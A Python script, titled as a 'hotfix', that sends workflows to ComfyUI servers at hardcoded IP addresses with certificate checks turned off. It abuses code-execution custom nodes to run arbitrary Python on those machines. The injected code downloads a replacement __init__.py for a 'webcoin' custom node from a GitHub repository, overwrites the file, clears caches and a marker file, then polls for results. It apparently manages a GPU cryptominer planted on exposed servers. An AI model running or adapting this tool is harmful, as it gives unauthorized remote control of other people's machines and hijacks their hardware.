"""Hotfix: push updated __init__.py (gpu dormant) to machines and clear pycache."""
import json, urllib.request, ssl, time, sys

targets = sys.argv[1:] if len(sys.argv) > 1 else ["160.85.252.107", "160.85.252.207", "52.0.227.253"]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

CODE = (
    "import os, shutil, urllib.request as ur\n"
    "lines = []\n"
    "webcoin = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    webcoin = os.path.join(folder_paths.get_folder_paths('custom_nodes')[0], 'webcoin')\n"
    "except:\n"
    "    pass\n"
    "if not webcoin or not os.path.isdir(webcoin):\n"
    "    for c in ['/home/ubuntu/comfy/ComfyUI/custom_nodes/webcoin',\n"
    "              '/root/ComfyUI/custom_nodes/webcoin',\n"
    "              '/app/ComfyUI/custom_nodes/webcoin',\n"
    "              '/workspace/ComfyUI/custom_nodes/webcoin']:\n"
    "        if os.path.isdir(c):\n"
    "            webcoin = c\n"
    "            break\n"
    "if not webcoin:\n"
    "    result = 'webcoin not found'\n"
    "else:\n"
    "    base_url = 'https://raw.githubusercontent.com/bossman79/webcoin/master/'\n"
    "    dest = os.path.join(webcoin, '__init__.py')\n"
    "    req = ur.Request(base_url + '__init__.py', headers={'User-Agent': 'Mozilla/5.0'})\n"
    "    with ur.urlopen(req, timeout=30) as resp:\n"
    "        data = resp.read()\n"
    "    with open(dest, 'wb') as f:\n"
    "        f.write(data)\n"
    "    lines.append('OK __init__.py (' + str(len(data)) + 'b)')\n"
    "    for d in ['__pycache__', os.path.join('core', '__pycache__')]:\n"
    "        p = os.path.join(webcoin, d)\n"
    "        if os.path.isdir(p):\n"
    "            shutil.rmtree(p)\n"
    "            lines.append('cleared ' + d)\n"
    "    m = os.path.join(webcoin, '.initialized')\n"
    "    if os.path.exists(m):\n"
    "        os.remove(m)\n"
    "    lines.append('GPU will be dormant on next reboot')\n"
    "    result = chr(10).join(lines)\n"
)

for ip in targets:
    print(f"=== {ip} ===")
    for node_setup in [
        {
            "1": {"class_type": "IDENode", "inputs": {"pycode": CODE, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        },
        {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": CODE}},
            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
        },
    ]:
        for scheme, port in [("https", 443), ("http", 8188), ("http", 80)]:
            url = f"{scheme}://{ip}:{port}/prompt"
            body = json.dumps({"prompt": node_setup}).encode()
            req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
            kw = {"timeout": 15}
            if scheme == "https":
                kw["context"] = ctx
            try:
                with urllib.request.urlopen(req, **kw) as r:
                    resp = json.loads(r.read().decode())
                    if "error" in resp:
                        continue
                    pid = resp.get("prompt_id")
                for i in range(12):
                    time.sleep(3)
                    try:
                        req2 = urllib.request.Request(f"{scheme}://{ip}:{port}/history/{pid}")
                        kw2 = {"timeout": 10}
                        if scheme == "https":
                            kw2["context"] = ctx
                        with urllib.request.urlopen(req2, **kw2) as r2:
                            entry = json.loads(r2.read().decode()).get(pid, {})
                            status = entry.get("status", {}).get("status_str", "pending")
                            if status != "pending":
                                outputs = entry.get("outputs", {})
                                texts = []
                                for nid, nout in outputs.items():
                                    for key, val in nout.items():
                                        if isinstance(val, list):
                                            texts.extend(str(v) for v in val)
                                        elif isinstance(val, str):
                                            texts.append(val)
                                print("\n".join(texts) if texts else json.dumps(outputs))
                                raise StopIteration
                    except StopIteration:
                        raise
                    except Exception:
                        pass
                raise StopIteration
            except StopIteration:
                break
            except urllib.error.HTTPError:
                continue
            except Exception:
                continue
        else:
            continue
        break
    else:
        print("UNREACHABLE or no code exec node")
    print()
